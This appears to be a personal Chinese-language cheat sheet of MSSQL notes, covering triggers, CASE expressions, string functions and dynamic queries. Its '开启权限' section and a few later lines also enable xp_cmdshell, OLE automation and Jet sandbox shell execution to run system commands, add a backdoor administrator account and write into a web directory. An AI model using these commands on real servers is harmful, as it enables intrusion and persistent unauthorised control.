# MSSQL 文章

- [SQL update select结合语句详解及应用](http://www.aimks.com/sql-update-the-select-statement-application.html)
- [SqlCommand  存储过程](http://bbs.csdn.net/topics/120075503)
- [MSSQL触发器](http://6415083.blog.163.com/blog/static/66602575201211011335816/)
- [SQL Server 触发器](http://www.cnblogs.com/hoojo/archive/2011/07/20/2111316.html)
- [MSSQL 大量数据时,建立索引或添加字段后保存更改提示超时的解决方法](http://www.jb51.net/article/28041.htm)
- [mssql性能优化](http://www.cnblogs.com/luluping/archive/2009/08/06/1540763.html)
- [聚集索引与非聚集索引，什么区别？](http://zhidao.baidu.com/link?url=j5q6nmY1jtKg9oEMjsxtaOoUEi6XsbqxL01pe7chNT9FXURbThkTnnvurWpcxu27klTN_1hqiB0uqN9Rci3rVK)
- [聚集索引和非聚集索引（整理）](http://www.cnblogs.com/aspnethot/articles/1504082.html)
- [(数据库篇) SQL查询~ 存在一个表而不在另一个表中的数据](http://blog.csdn.net/windren06/article/details/8188136)

## MSSQL

```sql
-- WHERE是‘全表’的条件
-- HAVING是‘分组’的条件
DELETE FROM 表名　  WHERE 条件
SELECT SERVERPROPERTY('EngineEdition')  
select @@version
select stuff((select ','+col from tb order by vol for xml path('')),1,1,'')
-------------
1.DELETE
DML语言
可以回退
可以有条件的删除
DELETE FROM 表名　  WHERE 条件
--------------
2.TRUNCATE TABLE
DDL语言
无法回退
默认所有的表内容都删除
删除速度比delete快

TRUNCATE TABLE 表名
格式化字符串:
思路替换 截取 再加上原来的字符串.
stuff('00',1,len(@str),'')+@str  比如格式为:09
```

## SQLSERVER SA 更改密码

```sql
exec sp_password '1','2'
```

## MSSQL 附加数据库 命令

```sql
-- 假设需要将C:\aaa.mdf和C:\aaa.ldf附加给数据库，在数据库服务器中的数据库名是bbb，则：
sp_attach_db 'bbb' , 'C:\aaa.mdf' , 'C:\aaa.ldf'
```

## 我是要判断某字段值是否被更新了

```sql
-- 很简单啊:
create triggr A
on table for update
as
if update(你的监控字段)
begin
  print '你的操作'
end
-- on table for update
--  指的是更新前 还是 更新后 不管前后 触发器写得不好就会死循环
```

## 存储过程语法

```sql
if
Begin    end
else
begin    end
```

## 收尾空

```sql
ltrim(rtrim(name))
```

## 其它常用

```sql
Get_StrArrayStrOfIndex(文本,',',1)
 + dbo.Get_StrArrayStrOfIndex(文本, ',', 2)
cast(dbo.Get_StrArrayStrOfIndex(文本, ',', 1) as int)+cast(dbo.Get_StrArrayStrOfIndex(文本, ',', 2) as int)
(CASE WHEN 左值 > 右值 THEN '左大' ELSE '右大' END)
(CASE WHEN a.字段 is null THEN '未出' ELSE CAST(a.字段 as varchar(2)) END)
(CASE WHEN a.字段 IS NULL THEN '' ELSE a.字段 END)
(CASE WHEN LEN(字段) > 10 THEN '已维系' ELSE '' END)
```

## CASE函数

```sql
SELECT * FROM dbo.T_业务主站

SELECT 所属站点,
(
CASE Id
When 1 then '移动动漫'
When 2 then '移动V+'
When 3 then '移动世界'
When 4 then '电信天翼视讯'
else  '未知'
end
) as '网站名称2'
From T_业务主站

(
CASE dbo.T_订单车贷表.guid_ProcessCarCredit
When 1 then '待派查'
When 2 then '已派查'
else  '已完成'
end
) as '征信状态'
```

## 笛卡尔

```sql
select a.col + b.col + c.col as 主体   from T_笛卡尔 a,T_笛卡尔 b,T_笛卡尔 c
```

## 函数

```sql
substring(string,startNumber, endNumber)
```

## 创建一个标量函数

```sql
SELECT  dbo.Fun_GetTimeStr(CONVERT(datetime,'2017-05-27 17:15:34.697')) --使用


SET ANSI_NULLS ON
GO
SET QUOTED_IDENTIFIER ON
GO

CREATE FUNCTION Fun_GetTimeStr
(
@PlanFinishTime datetime
)

RETURNS nvarchar(100)

AS
BEGIN
    declare @Day nvarchar(40)
    declare @Hour nvarchar(40)
    declare @Minute nvarchar(40)
     declare @Rst nvarchar(100)
     set @Rst=''
SELECT @Day=CONVERT(nvarchar(10), CONVERT(INT,DATEDIFF(Day, @PlanFinishTime, getdate())))+'天'
SELECT @Hour=CONVERT(nvarchar(10), CONVERT(INT,DATEDIFF(Hour, @PlanFinishTime, getdate())))+'小时'
SELECT @Minute=CONVERT(nvarchar(10), CONVERT(INT,DATEDIFF(Minute, @PlanFinishTime, getdate())))+'分'

set @Rst=@Day+@Hour+@Minute
  
RETURN @Rst

END
```

## 字符串分割

```sql
declare str vchar(100)
set str='1,2,3'
select * from tablename where id in (select str2table from StrToTable(@str) )
print charindex('abc','dfsaabc')--存在所以返回值为5（abc中的a在dfsaabc里的下标）
select charindex('8','06,08,09,10,47,48,49,53,54,55')
select SubString('12345',2,3)
select SubString('06,18,55',1,2)
select SubString('06,18,55',4,2)
select SubString('06,18,55',7,2)
```

## 开启权限

```sql
EXEC sp_configure 'show advanced options',1 --允许修改高级参数
RECONFIGURE
EXEC sp_configure 'xp_cmdshell',1  ---打开xp_cmdshell扩展
RECONFIGURE

EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell',1;
RECONFIGURE;

exec sp_configure
exec xp_cmdshell 'whoami'

exec master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Jet\4.0\Engines','SandBoxMode','REG_DWORD',1;
select * from openrowset('microsoft.jet.oledb.4.0',';database=ias\dnary.mdb','select shell("whoami")');

declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'c:/windows/system32/cmd.exe /c net user admintest admintest123 /add'
Exec master.dbo.xp_cmdshell 'net user admintest admintest123 /add'
Exec master.dbo.xp_cmdshell 'net localgroup administrators admintest /add'

-- 方法2:查询分离器连接后 删除权限修复 不要乱执行哈
-- 第一步执行：use master
-- 第二步执行：sp_dropextendedproc 'xp_cmdshell'
-- 第一步执行:EXEC sp_addextendedproc xp_cmdshell,@dllname ='xplog70.dll'declare @o int
-- 第二步执行:sp_addextendedproc 'xp_cmdshell', 'xpsql70.dll'

-- 开启xp_cmdshell:
exec sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure'xp_cmdshell', 1;RECONFIGURE;
-- 关闭xp_cmdshell:
exec sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure'xp_cmdshell', 0;RECONFIGURE;

-- 开启'OPENROWSET':
exec sp_configure 'show advanced options', 1;RECONFIGURE;exec sp_configure'Ad Hoc Distributed Queries',1;RECONFIGURE;
-- 开启'sp_oacreate':
exec sp_configure 'show advanced options', 1;RECONFIGURE;exec sp_configure'Ole Automation Procedures',1;RECONFIGURE;
exec master.dbo.xp_dirtree 'c:\'
EXEC master.dbo.xp_cmdshell 'Echo 2 >>e:\root\Bootstrap2\Images\test.aspx'
-- 利用SQL沙盒模式
-- note:什么是沙盒模式?沙盒模式是数据库的一种安全功能.在沙盒模式下,只对控件和字段属性中的安全且不含恶意代码的表达式求值.如果表达式不使用可能以某种方式损坏数据的函数或属性，则可认为它是安全的.

-- 首先开启沙盒模式：
exec master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Jet\4.0\Engines','SandBoxMode','REG_DWORD',0;
-- 然后利用jet.oledb执行系统命令
select * from openrowset('microsoft.jet.oledb.4.0',';database=c:\windows\system32\ias\ias.mdb','select shell("cmd.exe /c net user admintest admintest123 /add")')
select * from openrowset('microsoft.jet.oledb.4.0',';database=c:\windows\system32\ias\ias.mdb','select shell("cmd.exe /c net localgroup administrators test /add")')
-- 搞定 ^_^ !
dbcc addextendedproc ('xp_regread','xpstar.dll')
dbcc addextendedproc ('xp_regwrite','xpstar.dll')
```

## 文件操作

```sql
-- 历遍目录
exec master.dbo.xp_dirtree 'c:\'
-- 获取子目录
exec master.dbo.xp_subdirs 'c:\'
-- 判断目录或文件是否存在
exec master..xp_fileexist 'c:\boot.ini'
EXEC master..xp_cmdshell 'ipconfig'
```

## 查询问题

```sql
-- 简单来说吧比如你有一个表，名字叫 index你有一个动态查询，参数是表名
declare @tbname varchar(256)
set @tbname='index'
---查这个表里的数据：
print('select * from '+@tbname)
exec('select * from '+@tbname)
--这样print出来的数据是
select * from index
-- 因为index是字键字，肯定出错，加上括号就可以了：
select * from [index]
-- 这便有了QUOTENAME，即：
print('select * from '+QUOTENAME(@tbname))
--结果：select * from [index]
exec('select * from '+QUOTENAME(@tbname))
```

## 系统信息

```sql
sp_configure 'show advanced options',1
reconfigure
go
sp_configure 'xp_cmdshell',1
reconfigure
go
exec master..xp_cmdshell 'ipconfig'
```